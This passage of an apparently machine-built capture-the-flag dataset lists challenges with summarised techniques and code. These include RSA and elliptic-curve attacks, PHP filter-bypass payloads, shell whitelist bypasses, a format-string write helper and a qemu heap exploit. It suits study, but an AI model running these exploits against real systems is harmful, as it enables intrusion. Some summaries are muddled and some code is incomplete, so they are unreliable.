f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e"
    },
    {
        "name": "Easy RSA 2",
        "write_up": "dataset/raw/Easy RSA 2.md",
        "type": "crypto",
        "competition": [
            "ISITDTU/2019/Quals",
            "https://ctftime.org/event/803/tasks/"
        ],
        "score": 919,
        "max_score": 1000,
        "difficulty": 0.919,
        "knowledge": [
            "When cracking multi-prime RSA where primes are very close to each other, Fermat's factorization method is very effective. This method particularly applies when the modulus `n`'s prime factors have a small difference, which makes `n` susceptible to being factored if `c` (the difference between the product of pairs of primes) is less than `{4 * N}^{1 / 4}` from `sqrt(N)`. This technique can be applied to recover all prime factors by calculating the greatest common divisor (GCD) of combinations of these factors.",
            "After obtaining the prime factors in a multi-prime RSA scenario, computing the Carmichael's totient function (or Euler's totient function in the case of RSA) allows for the RSA private exponent `d` to be computed by finding the modular inverse of `e` modulo `\\phi(n)`. Once `d` is known, the encrypted message can be decrypted to reveal the flag. While the Euler's totient function `\\phi(n)` is typically used for RSA with two primes, Carmichael's function can provide the correct totient value for RSA schemes involving more than two prime numbers, ensuring the private key generated is valid for decryption."
        ],
        "key": "```python  \np1 = getPrime(512)  \np2 = gmpy2.next_prime(p1)  \nq1 = getPrime(512)  \nq2 = gmpy2.next_prime(q1)  \nn = p1 * p2 * q1 * q2  \nphi = (p1 - 1) * (p2 - 1) * (q1 - 1) * (q2 - 1)  \nd = gmpy2.invert(e,phi)  \n```"
    },
    {
        "name": "Easy RSA",
        "write_up": "dataset/raw/Easy RSA.md",
        "type": "crypto",
        "competition": [
            "BCACTF/2021",
            "https://ctftime.org/event/1369/tasks/"
        ],
        "score": 50,
        "max_score": 450,
        "difficulty": 0.1111111111111111,
        "knowledge": [
            "When dealing with RSA encryption challenges where the modulus \\(n\\) is a product of two primes \\(p\\) and \\(q\\), the decryption key \\(d\\) can be found by computing the modular inverse of \\(e\\) with respect to \\(\\phi(n) = (p - 1)(q - 1)\\). This method is applicable once the prime factors (\\(p\\) and \\(q\\)) and the public exponent (\\(e\\)) are known. This approach allows for the decryption of the ciphertext (\\(ct\\)) to get the plaintext.\n    - Example code segment for computing \\(d\\) and decrypting could look like the following:\n    ```python\n    p = int(input('p: ').strip())\n    q = int(input('q: ').strip())\n    e = int(input('e: ').strip())\n    ct = int(input('ct (as hex): ').strip(), 16)\n    \n    phi = (p - 1) * (q - 1)\n    d = getModInverse(e, phi)\n    \n    pt = pow(ct, d, p*q)  # p*q is n\n    ```",
            "In scenarios where the ciphertext (\\(ct\\)) and the encryption exponent (\\(e\\)) are relatively small compared to the modulus \\(n\\), it may be possible to decrypt \\(ct\\) simply by calculating the \\(e\\)th root of \\(ct\\) without performing modulo \\(n\\) operations. This approach is particularly feasible in situations where \\(ct^e < n\\), which could lead to a vulnerable implementation of RSA where the plaintext can be recovered directly.\n    - Example Python code for computing the plaintext from \\(ct\\) using the `gmpy2.iroot()` function would be:\n    ```python\n    import gmpy2\n    from Crypto.Util.number import long_to_bytes\n    \n    ct = 70415348471515884675510268802189400768477829374583037309996882626710413688161405504039679028278362475978212535629814001515318823882546599246773409243791879010863589636128956717823438704956995941\n    e = 3\n    \n    pt = gmpy2.iroot(ct, e)[0]\n    print(\"Flag is:\", long_to_bytes(pt).decode())\n    ```"
        ],
        "key": "```python  \n#!/bin/env python3\n\nfrom Crypto.Util.number import long_to_bytes  \nimport gmpy2\n\nct = 70415348471515884675510268802189400768477829374583037309996882626710413688161405504039679028278362475978212535629814001515318823882546599246773409243791879010863589636128956717823438704956995941  \ne = 3\n\n# Calculating e-th root of ciphertext  \npt = gmpy2.iroot(ct,e)[0]  \nprint(\"Flag is : \" + str(long_to_bytes(pt).decode()))  \n```"
    },
    {
        "name": "EASY-RSA",
        "write_up": "dataset/raw/EASY-RSA.md",
        "type": "crypto",
        "competition": [
            "SHELL/2021",
            "https://ctftime.org/event/1362/tasks/"
        ],
        "score": 50,
        "max_score": 500,
        "difficulty": 0.1,
        "knowledge": [
            "In RSA challenges where prime factors are obscured, and only partial direct information about the primes is given, a bitwise approach can be used to reconstruct the primes. Analyze the provided information like bitwise AND operations between the primes and their bit-shifted versions to establish constraints for each bit position. This method effectively narrows down the possible values of each bit in the prime factors.",
            "When ambiguity exists in determining the exact values of prime bits due to multiple satisfying cases, implement a depth-first search (DFS) strategy with pruning, using a visited array or set to avoid infinite recursion. This approach systematically explores all valid combinations of bits, allowing for the reconstitution of prime factors even when direct computation is impractical. For RSA challenges, once the prime factors are accurately determined, use the standard RSA decryption formula to retrieve the plaintext message from the ciphertext.\n\nExample payload for constructing and iterating over possible prime bits isn't directly applicable due to the nature of the approach, but the concept revolves around systematically testing and validating each possible bit configuration against the known constraints (the operations and results given in the challenge), and then applying depth-first search to proceed with the potential solutions."
        ],
        "key": "```python  \nfrom Crypto.Util.number import getPrime  \nfrom Crypto.Util.number import bytes_to_long\n\np = getPrime(2048)  \nq = getPrime(2048)  \nn = p * q  \ne = 65537  \nd = pow(e, -1, (p-1)*(q-1))  \nflag = open(\"flag.txt\",\"rb\").read()\n\nprint(f\"q & p = {q & p}\")  \nprint(f\"q & (p << 1) = {q & (p << 1)}\")  \nprint(f\"n = {n}\")  \nprint(f\"ct = {pow(bytes_to_long(flag), e, n)}\")  \n```"
    },
    {
        "name": "easyphp",
        "write_up": "dataset/raw/easyphp.md",
        "type": "pwn",
        "competition": [
            "0CTF/2020/Quals",
            "https://ctftime.org/event/1026/tasks/"
        ],
        "score": -1,
        "max_score": 846,
        "difficulty": -1,
        "knowledge": [
            "When encountering PHP challenges where direct invocation of system-level functions like `system`, `exec`, or `shell_exec` is disabled, it can be beneficial to leverage PHP's ability to execute code via `eval()` and use functions that are not typically disabled to interact with the system. This can include using `phpinfo()` to enumerate the PHP environment, `scandir()` to list directory contents, and file inclusion functions like `highlight_file()` or `file_get_contents()` to read file contents. This approach allows for indirect interaction with the system and can reveal sensitive information or files.\n   - Example payload for reading a file when direct execution functions are disabled: `highlight_file('path/to/secret_file.txt');`",
            "PHP's type juggling and operator behavior can be exploited to bypass character and function name restrictions imposed by input validation routines. In cases where a challenge applies filters or restrictions on the input (e.g., disallowing certain characters or strings), using bitwise operations like XOR (`^`) on permitted characters or leveraging PHP's interpretation of unquoted strings can enable constructing payloads that dynamically generate restricted characters or strings. This is especially useful when needing to invoke functions or access variables that would otherwise be blocked by the input validation.\n   - Example payload to craft restricted strings through type juggling and bitwise operations: `@(AD^\"12\").@(BB^\"23\").@(CC^\"34\")();` This pattern can be adapted to generate different characters based on ASCII values manipulated through XOR."
        ],
        "key": "```php\neval($_);\n```"
    },
    {
        "name": "ec3",
        "write_up": "dataset/raw/ec3.md",
        "type": "misc",
        "competition": [
            "DEFCON/2018/Quals",
            "https://ctftime.org/event/608/tasks/"
        ],
        "score": 149,
        "max_score": 500,
        "difficulty": 0.298,
        "knowledge": [
            "When dealing with custom qemu binary challenges that involve extra PCI devices, analyzing the binary for strings related to class initialization functions (e.g., \"ooo_class_init\") can help identify custom drivers or additional functionality not present in standard qemu binaries. This approach aids in understanding the custom implementation and could lead to discovering vulnerabilities stemming from these custom additions. Understanding the standard process of how devices are added to qemu, by looking at source code or documentation online, can significantly accelerate the reverse-engineering process. \n\nExample approach: Strings search in binary for device-related functions, followed by comparing with standard qemu device addition methods found in sources like the official qemu GitHub repository.",
            "For exploiting heap vulnerabilities in a scenario where a custom device allows for arbitrary read and writes without bounds checking, one effective strategy is to target the array holding `malloc`ed pointers in the bss segment by performing a precise heap exploitation. This can be achieved by corrupting chunk headers using the allocation functions provided by the vulnerable driver and leveraging the unlink macro during `free` operation to gain arbitrary write capabilities. Specifically, carefully forging a chunk and manipulating its headers (such as `prev_size` and `prev_inuse` flag) can allow an attacker to overwrite pointers in the bss segment, thus gaining control over where to read and write when accessing the driver's memory. The final step in the exploit can involve overwriting critical function pointers such as the Global Offset Table (GOT) entries to redirect execution flow, for instance, to a function that prints the flag.\n\nExample payload snippet:  \n```c  \n// Forging fake chunk and manipulating headers  \nwrite_heap(map_base, 0, 0x80, 0x80); // chunk2 prev_size  \nwrite_heap(map_base, 0, 0x94, 0x88); // unset PREV_INUSE bit for chunk2  \n// Overwrite pointer  \nwrite_heap(map_base, 0, pointer_address, offset);  \n// Redirect execution  \nwrite_heap(map_base, 1, function_to_redirect_to, 0);  \n```\nThis exploit technique demonstrates the application of heap exploitation principles to overwrite sensitive memory locations and achieve arbitrary code execution in the context of CTF challenges involving custom qemu devices with heap vulnerabilities."
        ],
        "key": "```c\nvoid pci_write(void *map_base, off_t target, int access_type, int64_t writeval) {  \n\tint type_width = 16;  \n\tint64_t read_result;  \n\tvoid *virt_addr;  \n  \n\tvirt_addr = map_base + (target & MAP_MASK);  \n\tswitch(access_type) {  \n\t\tcase 'b':  \n\t\t\t*((uint8_t *) virt_addr) = writeval;  \n\t\t\tbreak;  \n\t\tcase 'h':  \n\t\t\t*((uint16_t *) virt_addr) = writeval;  \n\t\t\tbreak;  \n\t\tcase 'w':  \n\t\t\t*((uint32_t *) virt_addr) = writeval;  \n\t\t\tbreak;  \n\t\tcase 'd':  \n\t\t\t*((uint64_t *) virt_addr) = writeval;  \n\t\t\tbreak;  \n\t}  \n\tfflush(stdout);  \n}\n\nvoid write_heap(void *map_base, int index, int64_t writeval, int offset) {  \n\toff_t target = offset | ((index & 0xF) << 16) | ((2 & 0xF) << 20);  \n\tpci_write(map_base, target, 'w', writeval);  \n}  \n\nvoid myfree(void *map_base, int index) {  \n\toff_t target = ((index & 0xF) << 16) | ((1 & 0xF) << 20);  \n\tpci_write(map_base, target, 'w', 0);  \n}\n\nint main(int argc, char **argv) {  \n\tint fd;  \n\tvoid *map_base;  \n\tchar *filename;  \n\toff_t target;  \n\tint access_type = 'w';\n\n\tfilename = \"/sys/devices/pci0000:00/0000:00:04.0/resource0\";  \n\ttarget = 0x0;  \n\taccess_type = 'w';  \n\targc = 0;\n\n\tif((fd = open(filename, O_RDWR | O_SYNC)) == -1) PRINT_ERROR;  \n\tmap_base = mmap(0, MAP_SIZE, PROT_READ | PROT_WRITE, MAP_SHARED, fd, target & ~MAP_MASK);  \n\tif(map_base == (void *) -1) PRINT_ERROR;  \n\n\tfor (int i = 0; i < 2000; i++)  \n\t\tmall(map_base, i % 4, 0x80);\n\n\twrite_heap(map_base, 0, 0, 0);  \n\twrite_heap(map_base, 0, 0, 4);  \n\twrite_heap(map_base, 0, 0x85, 8);  \n\twrite_heap(map_base, 0, 0, 12);  \n\twrite_heap(map_base, 0, 0x1317928, 16);  \n\twrite_heap(map_base, 0, 0x1317930, 24);\n\n\twrite_heap(map_base, 0, 0x80, 0x80);  \n\twrite_heap(map_base, 0, 0x94, 0x88);\n\n\tmyfree(map_base, 1);  \n\n\twrite_heap(map_base, 0, 0x011301A0, 32);  \n\twrite_heap(map_base, 0, 0, 36); \n\n\twrite_heap(map_base, 1, 0x6e65f9, 0);  \n\twrite_heap(map_base, 1, 0, 4);\n\n\tmyfree(map_base, 0);  \n  \n\tif(munmap(map_base, MAP_SIZE) == -1) PRINT_ERROR;  \n\tclose(fd);  \n\treturn 0;  \n}  \n```"
    },
    {
        "name": "Ecchimera",
        "write_up": "dataset/raw/Ecchimera.md",
        "type": "crypto",
        "competition": [
            "Crypto/2021",
            "https://ctftime.org/event/1258/tasks/"
        ],
        "score": 271,
        "max_score": 477,
        "difficulty": 0.5681341719077568,
        "knowledge": [
            "When facing an Elliptic Curve Discrete Logarithm Problem (ECDLP) on a curve defined over a composite field \\(Z_n\\) (where \\(n\\) is not prime), if \\(n\\) can be factored into primes \\(p\\) and \\(q\\), split the problem into subproblems over \\(F_p\\) and \\(F_q\\). For each subproblem, solve the discrete log problem in \\(F_p\\) and \\(F_q\\) independently. This can significantly simplify solving ECDLPs in non-prime fields.\n   - Example approach: Factor \\(n\\) using services like http://factordb.com/, then define curves over \\(GF(p)\\) and \\(GF(q)\\) to find discrete logs separately.",
            "Apply specific cryptographic attacks based on the properties of the curve orders over \\(F_p\\) and \\(F_q\\). If the order of the curve over \\(F_p\\) equals \\(p\\), indicating an anomalous curve, Smart's attack could be applied to solve the discrete logarithm efficiently. Whereas, for a curve over \\(F_q\\) with a smooth order, the Pohlig-Hellman algorithm is suitable, especially when the factors of the order are small primes, allowing for the discrete log problem to be broken into easier subproblems.\n   - Example payload for Smart's attack or Pohlig-Hellman algorithm could not be provided due to complexity but would involve implementing the respective attacks in a programming environment such as SageMath, catering to the curve and order's specific characteristics."
        ],
        "key": "```python\n#!/usr/bin/env python3\n\nfrom sage.all import *  \nfrom flag import flag\n\nn = 43216667049953267964807040003094883441902922285265979216983383601881964164181  \nU = 18230294945466842193029464818176109628473414458693455272527849780121431872221  \nV = 13100009444194791894141652184719316024656527520759416974806280188465496030062  \nW = 5543957019331266247602346710470760261172306141315670694208966786894467019982\n\nflag = flag.lstrip(b'CCTF{').rstrip(b'}')  \ns = int(flag.hex(), 16)  \nassert s < n\n\nE = EllipticCurve(Zmod(n), [0, U, 0, V, W])  \nG = E(6907136022576092896571634972837671088049787669883537619895520267229978111036,\n35183770197918519490131925119869132666355991678945374923783026655753112300226)\n\nprint(f'G = {G}')  \nprint(f's * G = {s * G}')  \n```"
    },
    {
        "name": "Echo Server",
        "write_up": "dataset/raw/Echo Server.md",
        "type": "reverse",
        "competition": [
            "BSidesAhmedabad/2020",
            "https://ctftime.org/event/1065/tasks/"
        ],
        "score": 496,
        "max_score": 500,
        "difficulty": 0.992,
        "knowledge": [
            "When dealing with format string vulnerabilities in an environment where specific sequences (like `%n`) are filtered or removed, one can use the format string parameter field to bypass the filter. By adjusting the parameter number, it is possible to indirectly utilize restricted sequences for arbitrary memory write operations. For example, if `%n` is filtered, you can use `%x$n` to perform writes or leak memory addresses, where `x` corresponds to the parameter number on the stack.",
            "In scenarios where buffer space is limited, and direct shellcode injection seems infeasible due to size constraints, altering control flow data (such as return addresses) or manipulating the program's execution state indirectly via format strings can provide a way to execute larger payloads or create a more favorable execution environment. This might involve techniques such as expanding the buffer beyond its initial limit by writing to specific memory locations, or leveraging functions like `mprotect` to make non-executable regions executable, thereby bypassing NX protections. For instance, to expand the buffer, one could write to a stack location (like `stack + 1053`) to artificially increase the number of bytes that can be read and processed.\n   \n   Example Python snippet to write to an arbitrary memory location leveraging the format string vulnerability:\n   ```python\n   def write(loc, what):\n       while what > 0:\n           next_byte = what & 0xff\n           if next_byte < 4:\n               send(b\"A\" * next_byte + b\"%7$n\" + b\"A\" * (4 - next_byte) + p32(loc) + b\"\\n\")\n           else:\n               send(p32(loc) + b\"A\" * (next_byte - 4) + b\"%5$n\\n\")\n           loc += 1\n           what >>= 8\n   ```"
        ],
        "key": "```c\n#include <stdio.h>\n#include <string.h>\n\nvoid echo_server() {\n    char buffer[12];\n    while (1) {\n        fgets(buffer, sizeof(buffer), stdin);\n        for (int i = 0; i < sizeof(buffer) - 1; i++) {\n            if (buffer[i] == '%' && buffer[i + 1] == 'n') {\n                buffer[i] = buffer[i + 1] = ' ';\n            }\n        }\n        printf(buffer);\n    }\n}\n\nint main() {\n    echo_server();\n    return 0;\n}\n```"
    },
    {
        "name": "echoechoechoecho",
        "write_up": "dataset/raw/echoechoechoecho.md",
        "type": "The type of this challenge is **pwn** (short for \"exploit\").",
        "competition": [
            "insomnihack/2019/Quals",
            "https://ctftime.org/event/686/tasks/"
        ],
        "score": 216,
        "max_score": 500,
        "difficulty": 0.432,
        "knowledge": [
            "When faced with a strict whitelist of allowed characters in command injection challenges, use creative methods to bypass character restrictions. This can include redefining allowed characters as variables and using them to concatenate or multiply to form restricted characters, or utilizing built-in shell features like ANSI-C quoting for encoding arbitrary commands. For instance, to encode restricted characters like `(`, one could use `echo=\\(; echo $echo$echo$echo$echo` to output four left brackets, exploiting the whitelisted `echo` command and assignment operation.",
            "For encoding digits which are not directly allowed by the character whitelist, leverage shell arithmetic or other shell functionalities to generate them. An example given in the writeup is using `$(($$==$$))` to represent the digit `1` and adding up these ones to form any required digit. This technique is essential for bypassing filters that restrict direct use of numeric characters but allow arithmetic or variable expansion operations."
        ],
